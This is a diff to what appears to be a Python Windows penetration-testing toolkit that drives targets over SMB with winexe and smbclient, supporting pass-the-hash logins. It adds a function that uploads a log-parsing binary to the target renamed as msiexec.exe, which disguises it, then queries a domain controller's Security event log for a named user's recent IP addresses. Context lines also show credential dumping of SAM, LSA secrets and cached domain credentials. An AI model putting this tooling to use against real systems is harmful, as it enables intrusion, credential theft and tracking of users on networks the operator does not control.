@@ -38,6 +38,7 @@ TOOLS = {
 	'tar': BASEDIR + '/win/tar.exe',
 	'nircmd': BASEDIR + '/win/nircmd.exe',
 	'runastask': BASEDIR + '/win/runastask.exe',
+	'logparser': BASEDIR + '/win/logparser.exe',
 	'mbsa': {'dll': BASEDIR + '/win/mbsa/$ARCH$/wusscan.dll', 'exe': BASEDIR + '/win/mbsa/$ARCH$/mbsacli.exe', 'cab': BASEDIR + '/win/mbsa/wsusscn2.cab', 'bat': BASEDIR + '/win/mbsa/mbsa.bat'},
 }
 CONF = {
@@ -371,6 +372,8 @@ def up_and_exec(localcmd, delete_after = True):
 		smbclient('put "%s" "\\windows\\temp\\msiexec.exe"' % localcmd[0])
 		ret = winexe('\\windows\\temp\\msiexec.exe %s' % ' '.join(localcmd[1:]))
 
+		print '\\windows\\temp\\msiexec.exe %s' % ' '.join(localcmd[1:])
+
 		if delete_after:
 			smbclient('del "\\windows\\temp\\msiexec.exe"')
 
@@ -537,7 +540,7 @@ def smb_download():
 
 def smb_creddump():
 	"""
-	[-s] <ip> [ user ] [ password | ntlm_hash ]
+	[-s] <ip> [ user ] [ passwd/nthash ]
 	Extract SAM, SECURITY, SYSTEM hives and dump SAM, DCC, LSA Secrets
 	"""
 
@@ -608,6 +611,22 @@ def smb_creddump():
 		pass
 
 	text("[*] SYSTEM, SAM and SECURITY hives were saved in the current directory.")
+
+def smb_lastlog():
+	"""
+	[-s] <ip> [ user ] [ passwd/nthash ] <username>
+	Retrieves last known IPs for given user from the DC's Event Logs. Provide DC IP.
+	"""
+
+	set_creds(4)
+	check_tool('logparser')
+	check_creds()
+
+	text("[*] Getting last 3 known IP addresses...")
+
+	smbclient('put "%s" "\\windows\\temp\\msiexec.exe"' % TOOLS['logparser'])
+	print winexe("\\windows\\temp\\msiexec.exe -q -i EVT \"SELECT TOP 3 EXTRACT_TOKEN(Strings, 6, '|') AS Domain, EXTRACT_TOKEN(Strings, 5, '|') AS User, EXTRACT_TOKEN(Strings, 18, '|') AS IP  FROM Security WHERE EventType=8 /*AND EventCategory=12544*/ AND STRLEN(IP) > 3 AND User='%s'\""% sys.argv[3])
+	smbclient('del "\\windows\\temp\\msiexec.exe"')
 
 def smb_scrshot():
 	"""
@@ -886,7 +905,7 @@ def smb_revfwd(lport = None, rhost = None, rport = None):
 
 def smb_mbsa():
 	"""
-	[-s] <ip> [ user ] [ passwd/nthash ]
+	[-s] <ip> [ user ] [ passwd/nthash ] [ update ]
 	Run MBSA on the remote host
 	"""
 
